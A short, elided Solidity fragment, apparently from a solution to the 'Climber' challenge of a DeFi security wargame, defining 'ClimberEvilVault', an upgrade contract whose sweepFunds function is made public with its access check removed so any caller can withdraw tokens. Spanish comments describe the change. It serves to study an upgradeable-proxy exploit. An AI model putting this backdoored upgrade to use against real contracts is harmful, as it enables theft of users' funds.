...
import "../../12_climber/ClimberTimelock.sol";
 ...
 */
contract ClimberEvilVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    ...
    // Allows trusted sweeper account to retrieve any tokens --> Haha trusted sweeper account dice. Hold my beer.
    function sweepFunds(address tokenAddress) public { //Hacemos publica la función, retiramos el modifier y cambiamos "_sweeper" por msg.sender
        IERC20 token = IERC20(tokenAddress);
